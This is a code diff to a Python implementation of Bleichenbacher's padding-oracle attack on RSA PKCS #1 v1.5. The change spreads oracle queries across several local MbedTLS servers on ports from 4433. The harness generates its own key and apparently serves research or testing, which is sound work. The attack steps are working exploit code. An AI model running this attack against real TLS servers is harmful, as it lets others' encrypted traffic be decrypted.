@@ -100,11 +100,19 @@ def blinding(k, key, c, oracle):
             return s_0, c_0
 
 
-def s_c_conform(key, c, s, oracle, k):
-    return oracle.query(((c * pow(s, key.e, key.n)) % key.n).to_bytes(k, byteorder='big'))
+def s_c_conform(key, c, s, oracles, k):
+    queries = []
+    for i, oracle in enumerate(oracles):
+        queries.append(oracle.query_async(((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big')))
+        next(queries[-1])  # send frame
+    retval = -1
+    for i, query in enumerate(queries):
+        if next(query) and retval == -1:  # recv result
+            retval = s + i
+    return retval
 
 
-def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
+def find_min_conforming(key, c_0, min_s, oracles, k_arg=None):
     """
     Step 2.a and 2.b of the attack
     :param key: RSA key
@@ -120,12 +128,13 @@ def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
     # Find the minimal s_i >= min_s such that the expression defined in the attack conforms.
     s_i = min_s
     while True:
-        if s_c_conform(key, c_0, s_i, oracle, k):
-            return s_i
-        s_i += 1
+        res = s_c_conform(key, c_0, s_i, oracles, k)
+        if res != -1:
+            return res
+        s_i += len(oracles)
 
 
-def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k_arg=None):
+def search_single_interval(key, B, prev_s, a, b, c_0, oracles, k_arg=None):
     """
     Step 2.c of the attack
     :param key: RSA key
@@ -148,9 +157,10 @@ def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k_arg=None):
         end_s -= int(egcd(3 * B + r_i * key.n, a) == a)
         s_i = start_s
         while s_i < end_s:
-            if s_c_conform(key, c_0, s_i, oracle, k):
-                return s_i
-            s_i += 1
+            res = s_c_conform(key, c_0, s_i, oracles, k)
+            if res != -1:
+                return res
+            s_i += len(oracles)
         r_i += 1
 
 
@@ -175,7 +185,7 @@ def narrow_m(key, m_prev, s, B):
     return merge_intervals(intervals)
 
 
-def bleichenbacher_attack(k, key, c, oracle, verbose=False):
+def bleichenbacher_attack(k, key, c, oracles, verbose=False):
     """
     Given an RSA public key and an oracle for conformity of PKCS #1 encryptions, along with a value c, calculate m = (c ** d) mod n
     :param k: length of ciphertext in bytes
@@ -187,7 +197,7 @@ def bleichenbacher_attack(k, key, c, oracle, verbose=False):
     B = 2 ** (8 * (k - 2))
 
     c = int.from_bytes(c, byteorder='big')
-    s_0, c_0 = blinding(k, key, c, oracle)
+    s_0, c_0 = blinding(k, key, c, oracles[0])
 
     if verbose:
         print("Blinding complete")
@@ -199,13 +209,13 @@ def bleichenbacher_attack(k, key, c, oracle, verbose=False):
         if verbose:
             print("Round ", i)
         if i == 1:
-            s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracle, k_arg=k)
+            s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracles, k_arg=k)
         elif len(m) > 1:
-            s = find_min_conforming(key, c_0, s + 1, oracle, k_arg=k)
+            s = find_min_conforming(key, c_0, s + 1, oracles, k_arg=k)
         else:
             a = m[0][0]
             b = m[0][1]
-            s = search_single_interval(key, B, s, a, b, c_0, oracle, k_arg=k)
+            s = search_single_interval(key, B, s, a, b, c_0, oracles, k_arg=k)
 
         m = narrow_m(key, m, s, B)
 
@@ -221,7 +231,14 @@ def bleichenbacher_attack(k, key, c, oracle, verbose=False):
         return None
 
 import time
+import sys
+
 if __name__ == "__main__":
+    start_port = 4433
+    if len(sys.argv) > 1:
+        num_servers = int(sys.argv[1])
+    else:
+        num_servers = 1
     n_length = 1024
     keyfilename = "priv.key.pem"
     #keyfile = tempfile.NamedTemporaryFile(suffix=".key.pem", delete=False)
@@ -251,11 +268,13 @@ if __name__ == "__main__":
     pub_key = key.public_key()
     k = int(n_length / 8)
 
-    oracle = PKCS1_v1_5_Oracle_MbedTLS(key)
+    oracles = []
+    for port in range(start_port, start_port + num_servers):
+        oracles.append(PKCS1_v1_5_Oracle_MbedTLS(key, port=port))
 
     c = b'\x00' + (k - 1) * bytes([1])
 
-    result = bleichenbacher_attack(k, pub_key, c, oracle, True)
+    result = bleichenbacher_attack(k, pub_key, c, oracles, True)
     print(result)
 
     #os.unlink(keyfilename)
